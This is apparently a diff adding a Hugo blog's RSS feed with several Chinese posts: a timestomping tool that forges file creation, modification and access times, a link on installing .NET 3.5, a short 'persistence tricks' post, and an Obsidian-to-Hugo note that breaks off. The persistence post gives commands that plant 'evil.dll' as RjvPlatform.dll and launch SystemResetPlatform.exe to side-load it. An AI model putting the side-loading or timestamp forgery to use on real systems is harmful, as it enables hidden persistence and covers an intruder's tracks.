@@ -1,0 +1,283 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on yutian's blog</title><link>https://yutianovo.github.com/post/</link><description>Recent content in Posts on yutian's blog</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 25 Jan 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://yutianovo.github.com/post/index.xml" rel="self" type="application/rss+xml"/><item><title>SharpFileTimeSetter-用于自定义文件的时间属性</title><link>https://yutianovo.github.com/p/sharpfiletimesetter-%E7%94%A8%E4%BA%8E%E8%87%AA%E5%AE%9A%E4%B9%89%E6%96%87%E4%BB%B6%E7%9A%84%E6%97%B6%E9%97%B4%E5%B1%9E%E6%80%A7/</link><pubDate>Sat, 25 Jan 2025 00:00:00 +0000</pubDate><guid>https://yutianovo.github.com/p/sharpfiletimesetter-%E7%94%A8%E4%BA%8E%E8%87%AA%E5%AE%9A%E4%B9%89%E6%96%87%E4%BB%B6%E7%9A%84%E6%97%B6%E9%97%B4%E5%B1%9E%E6%80%A7/</guid><description>&lt;p>下载地址：https://github.com/yutianqaq/SharpFileTimeSetter&lt;/p>
+&lt;h1 id="简介">简介
+&lt;/h1>&lt;p>用于自定义文件时间属性，实现文件属性获取与自定义创建、修改、访问时间。&lt;/p>
+&lt;p>还可以与同步指定文件的时间属性&lt;/p>
+&lt;h1 id="帮助">帮助
+&lt;/h1>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">SharpFileTimeSetter&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-help&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Usage&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="n">SharpSharpFileTimeSetter&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="o">-file&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="p">[-&lt;/span>&lt;span class="n">-get&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">[-&lt;/span>&lt;span class="n">-creation&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">date&lt;/span>&lt;span class="p">&amp;gt;]&lt;/span> &lt;span class="p">[-&lt;/span>&lt;span class="n">-modification&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">date&lt;/span>&lt;span class="p">&amp;gt;]&lt;/span> &lt;span class="p">[-&lt;/span>&lt;span class="n">-access&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">date&lt;/span>&lt;span class="p">&amp;gt;]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">SharpFileTimeSetter&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-sync&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">sourceFile&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">targetFile&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Example&lt;/span>&lt;span class="err">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">SharpFileTimeSetter&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="o">-file&lt;/span> &lt;span class="n">test&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-creation&lt;/span> &lt;span class="s2">&amp;#34;2025-01-01 12:00:00&amp;#34;&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-modification&lt;/span> &lt;span class="s2">&amp;#34;2025-01-02 14:00:00&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">SharpFileTimeSetter&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="o">-file&lt;/span> &lt;span class="n">test&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-get&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">SharpFileTimeSetter&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-sync&lt;/span> &lt;span class="n">source&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span> &lt;span class="n">target&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Arguments&lt;/span>&lt;span class="err">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">-&lt;/span>&lt;span class="o">-file&lt;/span> &lt;span class="n">Path&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">target&lt;/span> &lt;span class="n">file&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">required&lt;/span>&lt;span class="p">).&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">-&lt;/span>&lt;span class="n">-get&lt;/span> &lt;span class="n">Get&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">current&lt;/span> &lt;span class="n">creation&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">modification&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">and&lt;/span> &lt;span class="n">access&lt;/span> &lt;span class="n">time&lt;/span> &lt;span class="n">of&lt;/span> &lt;span class="n">the&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="p">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">-&lt;/span>&lt;span class="n">-creation&lt;/span> &lt;span class="n">Creation&lt;/span> &lt;span class="n">time&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="nb">set &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">optional&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">format&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="nb">yyyy-MM&lt;/span>&lt;span class="n">-dd&lt;/span> &lt;span class="n">HH&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">mm&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">ss&lt;/span>&lt;span class="p">).&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">-&lt;/span>&lt;span class="n">-modification&lt;/span> &lt;span class="n">Modification&lt;/span> &lt;span class="n">time&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="nb">set &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">optional&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">format&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="nb">yyyy-MM&lt;/span>&lt;span class="n">-dd&lt;/span> &lt;span class="n">HH&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">mm&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">ss&lt;/span>&lt;span class="p">).&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">-&lt;/span>&lt;span class="n">-access&lt;/span> &lt;span class="n">Access&lt;/span> &lt;span class="n">time&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="nb">set &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">optional&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">format&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="nb">yyyy-MM&lt;/span>&lt;span class="n">-dd&lt;/span> &lt;span class="n">HH&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">mm&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">ss&lt;/span>&lt;span class="p">).&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">-&lt;/span>&lt;span class="n">-sync&lt;/span> &lt;span class="n">Synchronize&lt;/span> &lt;span class="n">time&lt;/span> &lt;span class="n">properties&lt;/span> &lt;span class="n">from&lt;/span> &lt;span class="n">source&lt;/span> &lt;span class="n">file&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="n">target&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="p">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">sourceFile&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="n">Source&lt;/span> &lt;span class="n">file&lt;/span> &lt;span class="n">whose&lt;/span> &lt;span class="n">time&lt;/span> &lt;span class="n">will&lt;/span> &lt;span class="n">be&lt;/span> &lt;span class="n">copied&lt;/span>&lt;span class="p">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="n">targetFile&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="n">Target&lt;/span> &lt;span class="n">file&lt;/span> &lt;span class="n">whose&lt;/span> &lt;span class="n">time&lt;/span> &lt;span class="n">will&lt;/span> &lt;span class="n">be&lt;/span> &lt;span class="n">updated&lt;/span>&lt;span class="p">.&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="例子">例子
+&lt;/h2>&lt;p>创建测试文件&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">echo &lt;/span>&lt;span class="n">test&lt;/span> &lt;span class="p">&amp;gt;&lt;/span> &lt;span class="n">test&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>获取文件时间属性&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">SharpFileTimeSetter&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="o">-file&lt;/span> &lt;span class="n">test&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-get&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">File&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="n">test&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Creation&lt;/span> &lt;span class="n">Time&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="mf">2025&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">1&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">25&lt;/span> &lt;span class="mf">13&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">17&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">58&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Modification&lt;/span> &lt;span class="n">Time&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="mf">2025&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">1&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">25&lt;/span> &lt;span class="mf">13&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">17&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">58&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Access&lt;/span> &lt;span class="n">Time&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="mf">2025&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">1&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">25&lt;/span> &lt;span class="mf">13&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">17&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">58&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>修改文件属性&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">SharpFileTimeSetter&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="o">-file&lt;/span> &lt;span class="n">test&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-creation&lt;/span> &lt;span class="s2">&amp;#34;1999-09-09 12:00:00&amp;#34;&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-modification&lt;/span> &lt;span class="s2">&amp;#34;1999-09-09 12:00:00&amp;#34;&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-access&lt;/span> &lt;span class="s2">&amp;#34;1999-09-09 12:00:00&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Creation&lt;/span> &lt;span class="n">time&lt;/span> &lt;span class="nb">set &lt;/span>&lt;span class="n">to&lt;/span> &lt;span class="mf">1999&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">9&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">9&lt;/span> &lt;span class="mf">12&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">00&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">00&lt;/span>&lt;span class="p">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Modification&lt;/span> &lt;span class="n">time&lt;/span> &lt;span class="nb">set &lt;/span>&lt;span class="n">to&lt;/span> &lt;span class="mf">1999&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">9&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">9&lt;/span> &lt;span class="mf">12&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">00&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">00&lt;/span>&lt;span class="p">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Access&lt;/span> &lt;span class="n">time&lt;/span> &lt;span class="nb">set &lt;/span>&lt;span class="n">to&lt;/span> &lt;span class="mf">1999&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">9&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">9&lt;/span> &lt;span class="mf">12&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">00&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">00&lt;/span>&lt;span class="p">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">File&lt;/span> &lt;span class="n">time&lt;/span> &lt;span class="n">properties&lt;/span> &lt;span class="n">updated&lt;/span> &lt;span class="n">successfully&lt;/span>&lt;span class="p">.&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>检查修改后的属性&lt;/p>
+&lt;p>&lt;img src="https://yutianovo.github.com/images/img1.png"
+loading="lazy"
+alt="Image Description"
+>&lt;/p>
+&lt;p>同步指定文件的时间属性&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># 创建测试文件&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">PS &lt;/span>&lt;span class="n">D:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">bin&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Debug&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="n">test2&lt;/span> &lt;span class="p">&amp;gt;&lt;/span> &lt;span class="n">test2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">PS &lt;/span>&lt;span class="n">D:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">bin&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Debug&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">SharpFileTimeSetter&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="o">-file&lt;/span> &lt;span class="n">test2&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-get&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">File&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="n">test2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Creation&lt;/span> &lt;span class="n">Time&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="mf">2025&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">1&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">25&lt;/span> &lt;span class="mf">13&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">22&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">20&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Modification&lt;/span> &lt;span class="n">Time&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="mf">2025&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">1&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">25&lt;/span> &lt;span class="mf">13&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">22&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">20&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Access&lt;/span> &lt;span class="n">Time&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="mf">2025&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">1&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">25&lt;/span> &lt;span class="mf">13&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">22&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">20&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># 将文件 test 的时间属性同步给 test2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">PS &lt;/span>&lt;span class="n">D:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">bin&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Debug&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">SharpFileTimeSetter&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-sync&lt;/span> &lt;span class="n">test&lt;/span> &lt;span class="n">test2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Synced&lt;/span> &lt;span class="n">times&lt;/span> &lt;span class="n">from&lt;/span> &lt;span class="n">source&lt;/span> &lt;span class="s1">&amp;#39;test&amp;#39;&lt;/span> &lt;span class="n">to&lt;/span> &lt;span class="n">target&lt;/span> &lt;span class="s1">&amp;#39;test2&amp;#39;&lt;/span>&lt;span class="p">.&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">PS &lt;/span>&lt;span class="n">D:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">bin&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Debug&lt;/span>&lt;span class="p">&amp;gt;&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">SharpFileTimeSetter&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">exe&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="o">-file&lt;/span> &lt;span class="n">test2&lt;/span> &lt;span class="p">-&lt;/span>&lt;span class="n">-get&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">File&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="n">test2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Creation&lt;/span> &lt;span class="n">Time&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="mf">1999&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">9&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">9&lt;/span> &lt;span class="mf">12&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">00&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">00&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Modification&lt;/span> &lt;span class="n">Time&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="mf">1999&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">9&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">9&lt;/span> &lt;span class="mf">12&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">00&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">00&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Access&lt;/span> &lt;span class="n">Time&lt;/span>&lt;span class="err">:&lt;/span> &lt;span class="mf">2025&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">1&lt;/span>&lt;span class="p">/&lt;/span>&lt;span class="mf">25&lt;/span> &lt;span class="mf">13&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">19&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="mf">54&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item><item><title>在 Windows 11 中安装 .net3.5</title><link>https://yutianovo.github.com/p/%E5%9C%A8-windows-11-%E4%B8%AD%E5%AE%89%E8%A3%85-.net3.5/</link><pubDate>Sat, 25 Jan 2025 00:00:00 +0000</pubDate><guid>https://yutianovo.github.com/p/%E5%9C%A8-windows-11-%E4%B8%AD%E5%AE%89%E8%A3%85-.net3.5/</guid><description>&lt;p>docs/docs/framework/install/dotnet-35-windows.md at main · dotnet/docs&lt;br>
+&lt;a class="link" href="https://github.com/dotnet/docs/blob/main/docs/framework/install/dotnet-35-windows.md" target="_blank" rel="noopener"
+>https://github.com/dotnet/docs/blob/main/docs/framework/install/dotnet-35-windows.md&lt;/a>&lt;/p></description></item><item><title>权限维持技巧-1</title><link>https://yutianovo.github.com/p/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E5%B7%A7-1/</link><pubDate>Sat, 25 Jan 2025 00:00:00 +0000</pubDate><guid>https://yutianovo.github.com/p/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%8A%80%E5%B7%A7-1/</guid><description>&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">md C:\$SysReset\Framework\Stack\
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">copy evil.dll C:\$SysReset\Framework\Stack\RjvPlatform.dll
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">C:\Windows\System32\SystemResetPlatform\SystemResetPlatform.exe
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item><item><title>使用Obsdian写文章并通过脚本发布到Hugo测试</title><link>https://yutianovo.github.com/p/%E4%BD%BF%E7%94%A8obsdian%E5%86%99%E6%96%87%E7%AB%A0%E5%B9%B6%E9%80%9A%E8%BF%87%E8%84%9A%E6%9C%AC%E5%8F%91%E5%B8%83%E5%88%B0hugo%E6%B5%8B%E8%AF%95/</link><pubDate>Sat, 30 Nov 2024 00:00:00 +0000</pubDate><guid>https://yutianovo.github.com/p/%E4%BD%BF%E7%94%A8obsdian%E5%86%99%E6%96%87%E7%AB%A0%E5%B9%B6%E9%80%9A%E8%BF%87%E8%84%9A%E6%9C%AC%E5%8F%91%E5%B8%83%E5%88%B0hugo%E6%B5%8B%E8%AF%95/</guid><description>&lt;p>参考视频：https://www.youtube.com/watch?v=dnE7c0ELEH8&lt;br>
+参考文章：https://blog.networkchuck.com/posts/my-insane-blog-pipeline/&lt;/p>
+&lt;p>&lt;img src="https://yutianovo.github.com/images/Pasted%20image%2020241130212031.png"
+loading="lazy"
+alt="Image Description"
